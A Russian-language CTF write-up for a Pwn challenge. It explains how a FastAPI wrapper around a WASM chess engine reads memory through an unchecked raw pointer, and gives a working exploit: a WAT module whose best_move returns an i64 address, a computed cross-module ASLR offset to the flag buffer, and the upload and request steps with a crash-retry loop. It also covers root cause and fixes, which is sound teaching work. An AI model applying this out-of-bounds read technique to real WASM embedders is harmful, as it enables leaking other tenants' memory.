## В двух словах (без терминов)

Есть сайт, который играет с тобой в шахматы. Ход считает крошечная шахматная программа, запертая в
«стеклянном ящике» — специальной безопасной клетке, из которой программа якобы не может дотянуться до
остального компьютера. Внутри этого ящика, прямо в её памяти, лежит секрет — флаг.

Хитрость в том, что сайт разрешает **тебе загрузить свою собственную** шахматную программу и играть
против неё. А «руки», которыми сайт достаёт ответ из ящика, работают слишком грубо: он спрашивает у
твоей программы «по какому адресу лежит твой ход?» и **слепо читает по этому адресу**, не проверяя,
твой это ящик или чужой. Мы отвечаем: «мой ход лежит вон там» — и показываем на **соседний ящик с
пчелой**, где спрятан флаг. Сайт послушно читает соседскую память и выдаёт нам флаг под видом
шахматного хода.

## 1. Что за задача

Легенда: барсуки разгромили улей, а пчёлы «потушили самую умную» из своих. Секрет этой самой умной
пчелы нужно достать **прямо из её памяти**. Уже по формату задачи (Pwn, Python, WASM) понятно, где
искать баг: не в самой шахматной логике, а в **стыке** между Python и WASM — там, где одна программа
неаккуратно лезет в память другой.

> Мини-словарь. **Pwn** (от «pown», «завладеть») — класс задач, где надо захватить контроль над
> чужой программой через ошибку в работе с памятью. **WASM (WebAssembly)** — способ запускать
> программы внутри «песочницы»: изолированной клетки, откуда код по замыслу не может трогать ничего,
> кроме выделенной ему памяти. **Python** — язык, на котором написана «обвязка» вокруг этой клетки.

**Что нам дали.** Живой сервис `https://goliath-wmm0wh1s.avitoctf.ru/` — лончер с проверкой
«я не робот» (reCAPTCHA), который на 15 минут поднимает лично твой docker-контейнер и выдаёт его
адрес. И архив с **исходным кодом** `../goliath/goliath_c8c718c.zip` (в репозитории хранится одна
общая копия; после распаковки исходники лежат локально в `src/goliath/`):
там `Dockerfile`, обвязка `mcu-max.py`, сам движок `mcu-max.c/.h`, склейка `mcu-max-wrap.c`, готовый
скомпилированный `mcu-max.wasm` и веб-фронт.

> Мини-словарь. **Исходный код** — текст программы, который можно прочитать и понять её логику.
> **Docker-контейнер** — изолированная «коробка» с программой и всем нужным окружением, которую можно
> быстро запустить и выбросить. **`mcu-max`** — реальный шахматный движок «для микроконтроллеров»
> (очень маленький), его и запускают в WASM.

**Цель:** прочитать флаг из памяти запущенного в WASM шахматного движка «пчелы».

## 2. Разведка — что мы увидели

Сервис написан на **FastAPI** (веб-каркас на Python) и использует библиотеку `wasmtime==45.0.0` —
это и есть тот самый «движок песочницы», который запускает WASM-модули. В коде `mcu-max.py` есть класс
`Player` («игрок»), и вот его сердце:

```python
class Player:
    def __init__(self, engine, module):
        ...
        self.__memory = self.__exports["memory"].data_ptr(self.__store)   # mcu-max.py:17
        self.__fen_buffer = self.__exports["fen_buffer"]
        self.__best_move = self.__exports["best_move"]

    def best_move(self, fen: str) -> str:
        data = fen.encode("latin-1") + b"\x00"
        ...
        fen_buffer = self.__fen_buffer(self.__store)
        for i, b in enumerate(data):
            self.__memory[fen_buffer + i] = b        # mcu-max.py:30 — ЗАПИСЬ через сырой указатель
        ptr = self.__best_move(self.__store)
        ...
        move = bytearray()
        while b := self.__memory[ptr + len(move)]:    # mcu-max.py:37 — ЧТЕНИЕ через сырой указатель
            move.append(b)
        return move.decode("latin-1", errors="replace")
```

Здесь спрятана вся суть, поэтому разберём построчно простыми словами.

- `self.__memory = ...data_ptr(...)` — это «прямой адрес» начала памяти WASM-модуля. Важно: не
  безопасная «дверца с проверкой», а **сырой указатель** — буквально номер ячейки в памяти
  компьютера, по которому Python будет читать и писать напрямую.

  > Мини-словарь. **Память** программы — это длинная лента пронумерованных ячеек-байтов. **Указатель
  > (pointer)** — просто номер ячейки, «адрес». **Сырой указатель** — адрес без всякой защиты: по нему
  > читают, не проверяя, «а можно ли вообще сюда лезть».

- `self.__memory[fen_buffer + i] = b` — сайт записывает твой шахматный ход (позицию на доске) в память
  модуля, начиная с адреса `fen_buffer`, который **вернул сам модуль**.
- `ptr = self.__best_move(...)` — сайт спрашивает у модуля: «по какому адресу лежит твой ответный
  ход?». Модуль возвращает число `ptr`.
- `while b := self.__memory[ptr + len(move)]` — и вот ключ: сайт читает байты **начиная с адреса
  `ptr`** и до первого нулевого байта, а прочитанное отдаёт нам в ответе. `ptr` целиком пришёл от
  модуля, и **никто не проверяет**, попадает ли `ptr` внутрь памяти этого модуля.

> Мини-словарь. **FEN** — стандартная строчная запись шахматной позиции (кто где стоит, чей ход).
> Второе поле в ней — цвет, чей сейчас ход: `w` (белые) или `b` (чёрные). Это поле нам пригодится.

**Два игрока.** В сервисе живут два экземпляра `Player`:

- `BEE_PLAYER` («пчела») — создаётся один раз при старте сервера из штатного `mcu-max.wasm`
  (`mcu-max.py:44`). Именно в его памяти лежит флаг.
- `BADGER_PLAYER` («барсук») — **пересоздаётся из байтов, которые присылаем мы** на каждый
  `POST /api/upload`:

  ```python
  @API.post("/upload")
  async def upload(file: UploadFile):
      wasm_bytes = await file.read()
      module = Module(ENGINE, wasm_bytes)     # mcu-max.py:54 — проверка ОДНА: «это валидный wasm»
      player = Player(ENGINE, module)         # экспорты модуля никак не проверяются по типам
      BADGER_PLAYER = player
  ```

  > Мини-словарь. **`POST`-запрос** — способ отправить на сервер файл или данные (в отличие от простого
  > открытия страницы). **Экспорты модуля** — функции, которые WASM-модуль «выставляет наружу», чтобы
  > их можно было позвать (здесь `fen_buffer` и `best_move`).

**Как выбирается игрок.** Обычный эндпоинт `/api/best-move?fen=...` (`mcu-max.py:63-81`) смотрит на
второе поле FEN: `'w'` → пчела, `'b'` → барсук. Значит, послав FEN с цветом `b`, мы направим запрос
**в наш собственный, полностью подконтрольный модуль**.

**Где именно лежит флаг.** В склейке `mcu-max-wrap.c`:

```c
static char fen_buf[256] = FLAG;     // mcu-max-wrap.c:3  — ФЛАГ прямо здесь, как значение по умолчанию
static char move_buf[8];             // mcu-max-wrap.c:4

char *fen_buffer(void) { return fen_buf; }         // mcu-max-wrap.c:7
char *best_move(void) {
    mcumax_set_fen_position(fen_buf);
    mcumax_move move = mcumax_search_best_move(1000000, 30);
    if (move.from == INVALID || move.to == INVALID) return 0;
    char *p = move_buf;                             // всегда move_buf, никогда не fen_buf
    p = format_square(p, move.from); p = format_square(p, move.to); *p = 0;
    return move_buf;
}
```

`Makefile:1` содержит `FLAG := "avito{1111111111111111111111111111}"` и при сборке подставляет его в
`fen_buf` через `-DFLAG=$(FLAG)`. То есть на боевом сервере тот же `mcu-max.wasm` собран с **настоящим**
флагом вместо этой «единичной» заглушки. `Dockerfile` дополнительно кладёт файл `/flag` на диск
(`chmod 0400`), но `mcu-max.py` его нигде не читает — это отвлекающий манёвр (в David-версии; в
соседнем разборе Goliath именно этот файл и есть цель). Здесь секрет живёт **только** в
скомпилированном `fen_buf`.

Утилита `wasm2wat mcu-max.wasm` (переводит скомпилированный WASM обратно в читаемый текст)
подтверждает раскладку памяти пчелы: `(memory 2)` (2 страницы = 128 КиБ), а данные лежат по
фиксированному адресу — `(data $.data (i32.const 1072) "avito{111...}\00...")`. То есть `fen_buf`
начинается ровно на байте **1072 = 0x430** внутри памяти пчелы. Это число нам пригодится.

## 3. Как мы дошли до решения (главный раздел)

**Наблюдение 1 — «руки» сайта не проверяют границы.** `self.__memory` — это `data_ptr(store)`, то
есть сырой указатель (в терминах Python — `ctypes.POINTER(c_uint8)`), а не безопасные методы
`Memory.read()`/`write()` из той же библиотеки wasmtime.

> Почему это важно. У wasmtime есть **безопасная** дверца: методы `read`/`write` честно бросают ошибку,
> если ты пытаешься вылезти за пределы памяти модуля. А сырой указатель `ptr[i]` — это просто «прочитай
> байт по адресу `база + i`». Он **вообще ничего не знает** о размере памяти модуля. Если `i` большое,
> обращение уйдёт в чужую память процесса. Это классический OOB-read.

> Мини-словарь. **OOB-read (out-of-bounds read)** — «чтение за границами»: программа читает память
> там, где ей не положено.

**Проверка (локально).** Собрали минимальный WASM-модуль, где `best_move()` возвращает адрес чуть за
пределами задекларированной памяти (`0x10000`). Обращение по нему уронило процесс с ошибкой шины (Bus
error) — не мягким исключением Python, а жёстким крахом. Вывод: промах = гарантированный крах, никакой
«мягкой» песочницы на этом пути нет.

**Наблюдение 2 — можно вернуть адрес любой величины.** `/api/upload` создаёт модуль из наших байтов
**без проверки типов экспортов**. Значит, мы можем объявить `best_move()` возвращающим `i64`
(64-битное целое), а не `i32` (32-битное), как в оригинале.

> Почему это важно. 32-битное число — это адрес максимум до ~4 ГиБ, «внутри своего района». А
> 64-битное — адрес по **всему** адресному пространству процесса. Python-сторона тип возврата не
> сверяет — просто берёт число и разыменовывает его. Подтвердили локально: `wasmtime-py` действительно
> отдаёт Python целое любой величины.

**Тупик №1 — прочитать флаг «через пчелу напрямую».** Первая, наивная идея: послать пчеле
(`active='w'`) короткий валидный ход и надеяться прочитать «хвост» её `fen_buf`. Не вышло по устройству
кода: `best_move()` **всегда** возвращает указатель на `move_buf` (отдельный 8-байтовый буфер сразу
после `fen_buf`), либо `0`. Прочитать `fen_buf` штатным ходом пчелы нельзя в принципе — только через
**свой** модуль с подконтрольным `best_move()`.

**Наблюдение 3 — значит, нужно дотянуться в память соседа.** Наш барсук и пчела — это два разных
экземпляра, физически две разные области памяти. Вопрос: как узнать адрес пчелы, если он вроде бы
случайный?

> Мини-словарь. **ASLR (рандомизация адресов)** — защита ОС: при каждом запуске программа получает
> память по **случайным** адресам, чтобы атакующий не знал заранее, где что лежит. Похоже на то, как
> в отеле тебе каждый раз дают номер в случайном месте здания.

**Гипотеза.** wasmtime под каждую 32-битную память резервирует огромный кусок фиксированного размера
(~4 ГиБ + защитные страницы). Если между созданием пчелы (старт сервера) и созданием барсука (первая
загрузка) не происходит других больших резерваций, то ОС кладёт эти два куска **на ровную решётку** с
фиксированным шагом. Тогда адрес пчелы = адрес барсука ± постоянное расстояние, даже при включённом
ASLR: ASLR сдвигает **всю** решётку целиком, но не меняет расстояние между соседними ячейками.

> Мини-словарь. **`mmap`-резервация** — большой заранее «застолблённый» кусок адресного пространства.
> **Защитная страница (guard)** — пустая полоса-«буфер» вокруг памяти, куда любое обращение сразу
> роняет процесс. **Решётка** — представь парковку с одинаковыми размеченными местами: даже если въезд
> на всю парковку каждый раз в новом месте города, расстояние между соседними местами всегда одно.

**Проверка (macOS — тупик).** Первые замеры на macOS дали **нестабильный** зазор между базами двух
модулей: то `0x104000000`, то `0x846000000`, то ещё что-то. Оказалось, macOS рандомизирует каждый
крупный кусок независимо — это особенность именно этой ОС, а челлендж крутится на Linux
(`debian:bookworm`, см. `Dockerfile`).

**Проверка (настоящий Linux — работает).** Пересобрали `Dockerfile` из исходников 1:1 и прогнали 10
независимых свежих процессов: каждый создаёт пчелу, потом барсука, печатает оба адреса. Результат —
**10 из 10** дали ровно `badger_base − bee_base == −0x104000000`. Гипотеза подтвердилась: это
детерминированная константа движка, не зависящая от ASLR.

Итого абсолютный адрес чтения (относительно нашей же памяти барсука):
`0x104000000 (шаг решётки) + 0x430 (адрес fen_buf внутри памяти пчелы) = 0x104000430`.

### 3.1. Почему `0x104000430` промахивался на бою и как это чинится

Первая версия солвера била жёсткой константой `0x104000430` и на живом сервере промахнулась 15 раз
подряд (каждый промах = крах процесса → рестарт контейнера). Разобрались офлайн, на 1:1-пересобранных
образах:

- **Калибровку «10/10» сняли не в той обстановке.** Она получена в *голом скрипте* «пчела → барсук →
  печать», где между двумя резервациями ничего не происходит. А боевой сервис — это
  **uvicorn/FastAPI**: пчела создаётся при старте, барсук — только на первый `POST /api/upload`, и
  **между** этими моментами запуск веб-сервера успевает сделать несколько промежуточных небольших
  резерваций памяти (пулы потоков, арены аллокатора). Они «вклиниваются» между пчелой и барсуком и
  сдвигают барсука ещё ниже.

- **Реальная модель зазора** (замерено на живом сервере):

  ```
  bee_base − badger_base  =  0x104000000  +  k · 0x04000000 ,   k ∈ {0, 1, 2}
  распределение ≈  k=0 → 45 %,  k=1 → 7 %,  k=2 → 48 %
  ```

  То есть настоящий шаг «решётки» — не целые 4 ГиБ, а **`0x04000000` = 64 МиБ** (размер одной
  промежуточной резервации). Кандидатов на адрес чтения всего три:
  `OFFSET(k) = 0x104000000 + k·0x04000000 + 0x430`.

- **Отсюда 15 промахов.** Старый перебор шёл по шагу *целой* резервации (`N·0x104000000 + 0x430`), из
  которого осмыслен только `N=1` (это k=0), а он попадает лишь в ~45 % случаев. Правильного шага
  `0x04000000` в переборе не было вовсе.

- **Эмулированный amd64 — ловушка.** Под эмуляцией (Docker Desktop → QEMU/Rosetta) зазор **всегда**
  `0x104000000` (k=0), потому что эмуляция сериализует старт потоков и гонки промежуточных резерваций
  нет. Именно эта «идеальная детерминированность» и сбила калибровку. На настоящем amd64-Linux гонка
  есть, поэтому k «плавает».

- **Ограничение памяти контейнера не помогает.** Прогон с `docker run --memory=256m` раскладку не
  меняет: 4-ГиБ-резервация — это пустое адресное пространство (`PROT_NONE`), оно не занимает реальную
  память и под лимит не попадает.

**Как чинится (реализовано в `solve_david.py`).** Промах = крах процесса (SIGSEGV), а такой крах в
Python **нельзя** перехватить — нет мягкой ошибки. Зато `docker-compose.yml` держит
`restart: unless-stopped`: после краха контейнер поднимается заново с **новым случайным** k. Поэтому
солвер перебирает k по крэш-рестартам, концентрируя огонь на самой частой паре k∈{0,2} (~93 % запусков)
и изредка подмешивая k=1. При шансе попадания ≈0.46 за рестарт это сходится за 1–3 попытки.

> Мини-словарь. **SIGSEGV (segmentation fault)** — сигнал ОС «программа полезла в запретную память»,
> после которого процесс аварийно завершается.

> Альтернатива на будущее (из соседнего `../goliath/solve_goliath.py`): модуль-читалка, берущий адрес
> **динамически из байтов FEN**, а не зашитый константой в модуль. Тогда адрес можно менять без
> перезагрузки модуля — чище и переиспользуемо для более сложной ветки Голиафа.

### Бытовая аналогия «сердцевины»

Представь камеру хранения с ячейками одинакового размера, поставленными в ряд. Твоя ячейка — крайняя.
Работник камеры глухой и читает записки: ты пишешь «выдай содержимое ячейки номер такой-то», а он,
не глядя, отсчитывает ячейки от твоей и выдаёт, что там лежит. Ты пишешь номер **соседней** ячейки —
и работник спокойно достаёт чужой секрет. Расстояние до соседа всегда одно и то же (ячейки в ряд, шаг
фиксирован), даже если весь ряд камер переставили в другое здание (это и есть ASLR). Единственная
загвоздка — иногда между твоей и соседней ячейкой втискивают одну-две служебные тумбы (это k), так что
приходится пару раз перевесить записку.

## 4. В чём именно ошибка (суть уязвимости)

Простыми словами: **сайт доверяет числу, которое ему назвала недоверенная программа, как адресу в
памяти — и читает по нему, не проверяя границы.** WASM-песочница тут ни при чём: её обходит именно
неаккуратная Python-обвязка, проигнорировавшая безопасный способ доступа.

Точно (CWE-125, Out-of-bounds Read, первопричина — небезопасная граница Python↔WASM):

1. `mcu-max.py:17,30,37` — обвязка читает/пишет память модуля через сырой `data_ptr()`, а не через
   `Memory.read()/write()` с проверкой границ. Это убирает единственный барьер между «адресом внутри
   памяти модуля» и «любым адресом процесса».
2. `mcu-max.py:50-60` (`POST /api/upload`) инстанцирует **произвольный** клиентский модуль без проверки
   набора и типов экспортов. Значит `best_move()` можно объявить возвращающим `i64` вместо `i32` и
   вернуть им адрес далеко за пределами своей памяти.
3. Следствие (1)+(2): загрузив модуль, чей `best_move()` возвращает произвольное 64-битное смещение,
   получаем чтение любого адреса процесса — в том числе памяти **другого** модуля (`BEE_PLAYER`), где
   в `fen_buf` (`mcu-max-wrap.c:3`) лежит флаг.
4. Межмодульная читаемость обусловлена тем, что wasmtime кладёт линейные памяти как статические
   ~4 ГиБ `mmap`-резервации; при отсутствии крупных аллокаций между стартом и первой загрузкой ОС
   размещает их на детерминированной решётке, превращая «случайный» ASLR-адрес в предсказуемое
   относительное смещение.

## 5. Эксплойт по шагам

**Шаг 0 (вручную).** Открыть `https://goliath-wmm0wh1s.avitoctf.ru/`, пройти reCAPTCHA, нажать «Launch
Instance» — лончер поднимает персональный контейнер на 15 минут и выдаёт его URL. Это не
автоматизируется (виджет Google reCAPTCHA v2 с серверной проверкой).

**Шаг 1. Собрать вредоносный модуль-барсук** (`solve_david.py`, формат WAT — текстовая запись WASM):

```wat
(module
  (memory (export "memory") 1)
  (func (export "fen_buffer") (result i32)
    i32.const 0)                 ; безопасный адрес внутри своей памяти — запись хода туда безвредна
  (func (export "best_move") (result i64)
    i64.const 0x104000430))      ; шаг решётки (0x104000000) + адрес fen_buf у пчелы (0x430)
```

**Шаг 2. Загрузить модуль:**

```
POST /api/upload   (multipart file=badger.wasm)
-> {"status":"ok","bytes":83}
```

**Шаг 3. Дёрнуть штатный эндпоинт с цветом `'b'`** (роутится на барсука):

```
GET /api/best-move?fen=x%20b
-> {"best_move":"avito{...}"}
```

`fields[1] == 'b'` — единственное требование к строке `fen`. Она же уходит «ходом» в наш модуль:
`fen_buffer()` возвращает `0` (безопасный адрес в своей памяти, запись туда безвредна), а
`best_move()` возвращает наш адрес — Python читает по нему байты до `\x00` и кладёт их прямо в
JSON-ответ под видом «хода».

**Шаг 4 (если крах/обрыв).** `docker-compose.yml` держит `restart: unless-stopped` — подождать пару
секунд и повторить шаги 2-3 (см. retry-цикл в `solve_david.py`). Локально на идентичной пересборке
образа 12 из 12 свежих контейнеров отдали флаг за 1-3 попытки.

Запуск целиком:

```
uv run python david/solve_david.py --url https://<адрес после Launch Instance>/
```

## 7. Мораль — какой это урок

Это очень «взрослая» ошибка: **встраивающий код доверяет указателю, который назвала недоверенная
программа** (в литературе — confused deputy, «сбитый с толку исполнитель»).

- **Что сделали не так.** Взяли из песочницы сырой указатель `data_ptr()` и индексировали его числами,
  которые вернул загруженный участником модуль, — без всякой проверки границ. Тем самым обесценили
  саму идею WASM-песочницы: клетка изолирует только память *модуля*, а сырой указатель ведёт по всему
  процессу.
- **Почему так вышло.** Заблуждение «WASM же безопасен, значит, и данные из него безопасны». Нет:
  WASM изолирует **код**, но число, которое этот код вернул, — это просто недоверенные **данные**, а
  не гарантированно валидный адрес.
- **Как надо было.** Пользоваться `Memory.read(store, ptr, ptr+len)` / `Memory.write(...)`, которые
  бросают исключение при выходе за границы, и **никогда** не отдавать наружу сырой `data_ptr`. Плюс
  проверять, что загруженный модуль экспортирует функции с ожидаемыми **сигнатурами** (`best_move`
  обязан возвращать `i32`, а не `i64`).
- **На что смотреть, чтобы не повторить.** Любое место, где «доверенный» код принимает от
  «недоверенного» число и использует его как индекс/адрес/смещение — потенциальный OOB. И ещё урок про
  ASLR: **это не одно случайное число на процесс**. Одинаковые крупные резервации (как статические
  WASM-памяти) часто ложатся на решётку с фиксированным шагом — относительное смещение предсказуемо,
  даже когда абсолютный адрес «случайный». Это стандартный источник межобъектных примитивов в pwn.
